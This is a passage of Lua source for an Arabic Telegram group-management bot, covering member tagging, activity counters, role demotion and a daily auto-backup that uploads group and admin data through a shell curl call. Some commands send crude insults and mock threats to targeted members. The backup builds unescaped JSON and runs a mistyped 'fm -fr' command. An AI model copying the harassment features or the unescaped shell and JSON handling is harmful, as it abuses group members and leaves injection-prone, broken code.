function TagAll(dp1,dp2)
local text = "⋄︙قائمة اعضاء المجموعة \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevHmD:get(DevTwix..'Save:UserName'..v.user_id_) then
text = text.."*~"..i.." :* [@"..DevHmD:get(DevTwix..'Save:UserName'..v.user_id_).."]\n"
else
end
end 
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
end
---------------------------------------------------------------------------------------
if text and text:match("^كللهم (.*)$") and ChCheck(msg) then
local txt = {string.match(text, "^(كللهم) (.*)$")}
if not DevHmD:get(DevTwix..'HmD:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "⋄︙"..txt[2].." \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevHmD:get(DevTwix..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevHmD:get(DevTwix..'Save:UserName'..v.user_id_).."]\n"
else
text = text..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_HmD(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
end
end
---------------------------------------------------------------------------------------
if (text and not DevHmD:get(DevTwix.."HmD:Lock:AutoFile")) then
Time = DevHmD:get(DevTwix.."HmD:AutoFile:Time")
if Time then 
if Time ~= os.date("%x") then 
local list = DevHmD:smembers(DevTwix..'HmD:Groups') 
local BotName = (DevHmD:get(DevTwix.."HmD:NameBot") or 'تويكس')
local GetJson = '{"BotId": '..DevTwix..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(list) do 
LinkGroups = DevHmD:get(DevTwix.."HmD:Groups:Links"..v)
Welcomes = DevHmD:get(DevTwix..'HmD:Groups:Welcomes'..v) or ''
HmDConstructors = DevHmD:smembers(DevTwix..'HmD:HmDConstructor:'..v)
HMDicConstructors = DevHmD:smembers(DevTwix..'HmD:HMDicConstructor:'..v)
Constructors = DevHmD:smembers(DevTwix..'HmD:Constructor:'..v)
Managers = DevHmD:smembers(DevTwix..'HmD:Managers:'..v)
Admis = DevHmD:smembers(DevTwix..'HmD:Admins:'..v)
Vips = DevHmD:smembers(DevTwix..'HmD:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
end
if #Vips ~= 0 then 
GetJson = GetJson..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Admis ~= 0 then
GetJson = GetJson..'"Admis":['
for k,v in pairs(Admis) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Managers ~= 0 then
GetJson = GetJson..'"Managers":['
for k,v in pairs(Managers) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Constructors ~= 0 then
GetJson = GetJson..'"Constructors":['
for k,v in pairs(Constructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #HMDicConstructors ~= 0 then
GetJson = GetJson..'"HMDicConstructors":['
for k,v in pairs(HMDicConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #HmDConstructors ~= 0 then
GetJson = GetJson..'"HmDConstructors":['
for k,v in pairs(HmDConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if LinkGroups then
GetJson = GetJson..'"LinkGroups":"'..LinkGroups..'",'
end
GetJson = GetJson..'"Welcomes":"'..Welcomes..'"}'
end
GetJson = GetJson..'}}'
local File = io.open('./'..DevTwix..'.json', "w")
File:write(GetJson)
File:close()
local HmD = 'https://api.telegram.org/bot' .. TokenBot .. '/sendDocument'
local curl = 'curl "' .. HmD .. '" -F "chat_id='..DevId..'" -F "document=@'..DevTwix..'.json' .. '" -F "caption=⋄︙نسخه تلقائيه تحتوي على » '..#list..' مجموعه"'
io.popen(curl)
io.popen('fm -fr '..DevTwix..'.json')
DevHmD:set(DevTwix.."HmD:AutoFile:Time",os.date("%x"))
end
else 
DevHmD:set(DevTwix.."HmD:AutoFile:Time",os.date("%x"))
end
end
---------------------------------------------------------------------------------------
if text == "رسائلي" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then
local user_msgs = DevHmD:get(DevTwix..'HmD:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙عدد رسائلك هنا » *( "..user_msgs.." )*", 1, 'md')
end
if text == "التفاعل" and ChCheck(msg) then
local EntryNumber = (DevHmD:get(DevTwix..'HmD:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local ExitNumber = (DevHmD:get(DevTwix..'HmD:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local MsgNumberDay = (DevHmD:get(DevTwix..'HmD:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
local Text = "⋄︙*معلومات المجموعة اليومية .*\n\n⋄︙انضمام الاعضاء اليوم » *"..EntryNumber.."*\n⋄︙مغادرة الاعضاء اليوم » *"..ExitNumber.."*\n⋄︙عدد الرسائل اليوم » *"..MsgNumberDay.."*\n⋄︙نسبة التفاعل اليوم » *"..math.random(40,100).."%*"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✧ TeAm Twix .',url="https://t.me/DevTwix"}},
{{text="• اخفاء الكليشة•",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false 
end
---------------------------------------------------------------------------------------
if text == "تعطيل تفاعلي" and Manager(msg) and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تعطيل امر تفاعلي",'md')
DevHmD:del(DevTwix..'HmD:msg:HmD'..msg.chat_id_) 
end
if text == "تفعيل تفاعلي" and Manager(msg) and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تفعيل امر تفاعلي",'md')
DevHmD:set(DevTwix..'HmD:msg:HmD'..msg.chat_id_,true)  
end
if DevHmD:get(DevTwix.."HmD:msg:HmD"..msg.chat_id_) then
if msg.content_.ID then
get_msg = DevHmD:get(DevTwix.."HmD:msg:HmD"..msg.sender_user_id_..":"..msg.chat_id_) or 0
gms = get_msg + 1
DevHmD:setex(DevTwix..'HmD:msg:HmD'..msg.sender_user_id_..":"..msg.chat_id_,86400,gms)
end
if text == 'تفاعلي' and tonumber(msg.reply_to_message_id_) == 0 then    
get_msg = DevHmD:get(DevTwix.."HmD:msg:HmD"..msg.sender_user_id_..":"..msg.chat_id_) or 0
local Text = "⋄︙*عدد رسائلك اليومية .*"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ''..get_msg..'' ,url="https://t.me/DevTwix"}},
{{text="• اخفاء الان •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false 
end  
if text == 'تفاعله' then    
if tonumber(msg.reply_to_message_id_) ~= 0 then 
function prom_reply(extra, result, success) 
get_msg = DevHmD:get(DevTwix.."HmD:msg:HmD"..result.sender_user_id_..":"..msg.chat_id_) or 0
local Text = "⋄︙*عدد رسائلة الكلية .*"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ''..get_msg..'' ,url="https://t.me/DevTwix"}},
{{text="• اخفاء الان •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false 
end  
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},prom_reply, nil)
end
end
end
---------------------------------------------------------------------------------------
if text == "جهاتي" and ChCheck(msg) or text == "اضافاتي" and ChCheck(msg) then add = (tonumber(DevHmD:get(DevTwix..'HmD:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙عدد جهاتك المضافه » *❨ "..add.." ❩* ", 1, 'md') end
if text == "تعديلاتي" or text == "سحكاتي" and ChCheck(msg) then local edit_msg = DevHmD:get(DevTwix..'HmD:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙عدد تعديلاتك » *❨ "..edit_msg.." ❩* ", 1, 'md') end
if text == "رتبتي" and ChCheck(msg) then Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙رتبتك » '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'html') end
if text == "ايدي المجموعه" and ChCheck(msg) then Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙ايدي المجموعه » `"..msg.chat_id_.."`", 1, 'md') end
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevHmD:del(DevTwix..'HmD:EditMsg'..msg.chat_id_..msg.sender_user_id_) Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then 
DevHmD:del(DevTwix..'HmD:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم حذف جميع جهاتك المضافه' , 1, 'md') 
end
end
---------------------------------------------------------------------------------------
if text and text:match('^هينه @(.*)') and ChCheck(msg) or text and text:match('^هينها @(.*)') and ChCheck(msg) then 
if not DevHmD:get(DevTwix..'HmD:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^هينه @(.*)') or text:match('^هينها @(.*)') 
function DevTwixTeam(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(DevTwix) then  
Dev_HmD(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_HmD(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if tonumber(result.id_) == tonumber(1558668590) then 
Dev_HmD(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if DevHmD:sismember(DevTwix.."HmD:HmDConstructor:"..msg.chat_id_,result.id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local DevTwixTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md') 
local DevTwixTeam = { "لكك جرجف @"..username.." احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش لكك فاشل @"..username.." لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","حبيبي @"..username.." راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪","دمشي لك @"..username.." ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع @"..username.." متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪",}
Dev_HmD(msg.chat_id_, result.id_, 1,''..DevTwixTeam[math.random(#DevTwixTeam)], 1, 'html') 
else  
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,DevTwixTeam)
end
end
--     Source DevTwix     --
if text == ("هينه") or text == ("بعد هينه") or text == ("هينه بعد") or text == ("لك هينه") or text == ("هينها") or text == ("هينهه") or text == ("رزله") or text == ("رزلهه") or text == ("رزلها") then
if not DevHmD:get(DevTwix..'HmD:Lock:Stupid'..msg.chat_id_) then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(DevTwix) then 
Dev_HmD(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_HmD(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if tonumber(result.sender_user_id_) == tonumber(1558668590) then  
Dev_HmD(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if DevHmD:sismember(DevTwix.."HmD:HmDConstructor:"..msg.chat_id_,result.sender_user_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local DevTwixTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md') 
local DevTwixTeam = {"لكك جرجف احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
Dev_HmD(msg.chat_id_, result.id_, 1,''..DevTwixTeam[math.random(#DevTwixTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
end
if text == ("بوسه") or text == ("بعد بوسه") or text == ("ضل بوس") or text == ("بوسه بعد") or text == ("بوسها") or text == ("بعد بوسها") or text == ("ضل بوس") or text == ("بوسها بعد") or text == ("بوسهه") then
if not DevHmD:get(DevTwix..'HmD:Lock:Stupid'..msg.chat_id_) then
function bosh(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(DevTwix) then 
Dev_HmD(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_HmD(msg.chat_id_, result.id_, 1, 'مواححح احلاا بوسةة المطوريي😻🔥💗', 1, 'html')
return false
end 
local DevTwixTeam = "صار حبيبي 😂💓" 
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md') 
local DevTwixTeam = {"اوفوف محح 🥺💗","مححهۂ","مححححا 🌚😂💓","العافيةة مححةة 🌝😹💘","مح مح مح 🥺😂💓"}
Dev_HmD(msg.chat_id_, result.id_, 1,''..DevTwixTeam[math.random(#DevTwixTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosh)   
end
end
end
if text and text:match('^بوسه @(.*)') and ChCheck(msg) or text and text:match('^بوسة @(.*)') and ChCheck(msg) then 
if not DevHmD:get(DevTwix..'HmD:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^بوسه @(.*)') or text:match('^بوسها @(.*)') 
function DevTwixTeam(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(DevTwix) then  
Dev_HmD(msg.chat_id_, msg.id_, 1,'شلون ابوس نفسي فهمني 🤣', 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(1558668590) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'مطور السورس العشق مححا 🌚??', 'md') 
return false  
end  
local DevTwixTeam = "صار يروحي 🤙🏿" 
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md') 
local DevTwixTeam = { "يروحي محح @"..username.." للشفة 🥺💔","محححا @"..username.." للخشم 😋😂💓","حبيبي @"..username.." من لحلك محح 🌚😂💓","اوفوفف @"..username.." مح مح 😘🤣","العافية @"..username.." محا محا 🥰",}
Dev_HmD(msg.chat_id_, result.id_, 1,''..DevTwixTeam[math.random(#DevTwixTeam)], 1, 'html') 
else  
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,DevTwixTeam)
end
end
if text == ("صيحه") or text == ("صيحها") or text == ("صيحهه") or text == ("صيح") then
if not DevHmD:get(DevTwix..'HmD:Lock:Stupid'..msg.chat_id_) then
function seha(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(DevTwix) then 
Dev_HmD(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_HmD(msg.chat_id_, result.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️', 1, 'html')
return false
end 
local DevTwixTeam = "صار عمري 🌚💓" 
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md') 
local DevTwixTeam = {"تتعال ححب محتاجيك🙂🍭","تعال يولل استاذكك ايريدككك😒🔪","يمعوود تعاال يريدوكك🤕♥️","تعال لكك ديصيحوك😐🖤"} 
Dev_HmD(msg.chat_id_, result.id_, 1,''..DevTwixTeam[math.random(#DevTwixTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),seha)   
end
end
end
--     Source DevTwix     --
if text and text:match('^صيحه @(.*)') and ChCheck(msg) or text and text:match('^صيح @(.*)') and ChCheck(msg) then 
if not DevHmD:get(DevTwix..'HmD:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^صيحه @(.*)') or text:match('^صيح @(.*)') 
function DevTwixTeam(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(DevTwix) then  
Dev_HmD(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_HmD(msg.chat_id_, msg.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️ @'..username, 1, 'html') 
return false  
end  
local DevTwixTeam = "ماشي عمري 💓" 
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md') 
local DevTwixTeam = { "تتعال ححب @"..username.." محتاجيك🙂🍭","تعال يولل @"..username.." استاذكك ايريدككك😒🔪","يمعوود @"..username.." تعاال يريدوكك🤕♥️","تعال لكك @"..username.." ديصيحوك😐🖤",}
Dev_HmD(msg.chat_id_, result.id_, 1,''..DevTwixTeam[math.random(#DevTwixTeam)], 1, 'html') 
else  
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,DevTwixTeam)
end
end
if text and text:match('^كله اكرهك @(.*)') and ChCheck(msg) or text and text:match('^كلها اكرهج @(.*)') and ChCheck(msg) then 
if not DevHmD:get(DevTwix..'HmD:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^كله اكرهك @(.*)') or text:match('^كلها اكرهج @(.*)') 
function DevTwixTeam(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(DevTwix) then  
Dev_HmD(msg.chat_id_, msg.id_, 1,'زعم اني ماكره نفسيي 🌚😂', 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(1558668590) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'تاج راسك ما ينكره حبيبي الورد 😘😂', 'md') 
return false  
end  
local DevTwixTeam = "زعم صار 😋💔" 
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md') 
local DevTwixTeam = { "اكلك @"..username.." زعم اني اكرهكك 🌚💓","اكرهك يمعود @"..username.." 🌝😹","مكروه @"..username.."😂💓","هسه لو حلو جان حبيتك @"..username.."🤣","عود ثكيل @"..username.."  ميدري مكروه 🌚😹",}
Dev_HmD(msg.chat_id_, result.id_, 1,''..DevTwixTeam[math.random(#DevTwixTeam)], 1, 'html') 
else  
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,DevTwixTeam)
end
end
---------------------------------------------------------------------------------------
if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and Manager(msg) and ChCheck(msg) then 
function promote_by_reply(extra, result, success)
if SudoId(result.sender_user_id_) == true then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end
if DevHmD:sismember(DevTwix..'HmD:HmDSudo:',result.sender_user_id_) then
HmDsudo = 'المطورين الاساسيين • ' else HmDsudo = '' end
if DevHmD:sismember(DevTwix..'HmD:SecondSudo:',result.sender_user_id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevHmD:sismember(DevTwix..'HmD:SudoBot:',result.sender_user_id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevHmD:sismember(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_, result.sender_user_id_) then
HMDicconstructor = 'المنشئين الاساسيين • ' else HMDicconstructor = '' end
if DevHmD:sismember(DevTwix..'HmD:Constructor:'..msg.chat_id_, result.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevHmD:sismember(DevTwix..'HmD:Managers:'..msg.chat_id_, result.sender_user_id_) then
manager = 'المدراء • ' else manager = '' end
if DevHmD:sismember(DevTwix..'HmD:Admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevHmD:sismember(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevHmD:sismember(DevTwix..'HmD:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
if RankChecking(result.sender_user_id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم تنزيله من » \n~ ( "..HmDsudo..secondsudo..sudobot..HMDicconstructor..constructor..manager..admins..vipmem..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙لم تتم ترقيته مسبقا")  
end
if HmDDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevHmD:srem(DevTwix..'HmD:HmDSudo:', result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:SecondSudo:', result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:SudoBot:', result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Managers:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif HmDDelAll(msg.sender_user_id_,msg.chat_id_) == 'HmDsudo' then
DevHmD:srem(DevTwix..'HmD:SecondSudo:', result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:SudoBot:', result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Managers:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif HmDDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
DevHmD:srem(DevTwix..'HmD:SudoBot:', result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Managers:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif HmDDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Managers:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_,result.sender_user_id_)
elseif HmDDelAll(msg.sender_user_id_,msg.chat_id_) == 'HmDconstructor' then
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Managers:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif HmDDelAll(msg.sender_user_id_,msg.chat_id_) == 'HMDicconstructor' then
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Managers:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif HmDDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Managers:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif HmDDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:VipMem:'..msg.chat_id_, result.sender_user_id_)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^تنزيل الكل @(.*)$") and Manager(msg) and ChCheck(msg) then
local rem = {string.match(text, "^(تنزيل الكل) @(.*)$")}
function remm(extra, result, success)
if result.id_ then
if SudoId(result.id_) == true then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end
if DevHmD:sismember(DevTwix..'HmD:HmDSudo:',result.id_) then
HmDsudo = 'المطورين الاساسيين • ' else HmDsudo = '' end
if DevHmD:sismember(DevTwix..'HmD:SecondSudo:',result.id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevHmD:sismember(DevTwix..'HmD:SudoBot:',result.id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevHmD:sismember(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_, result.id_) then
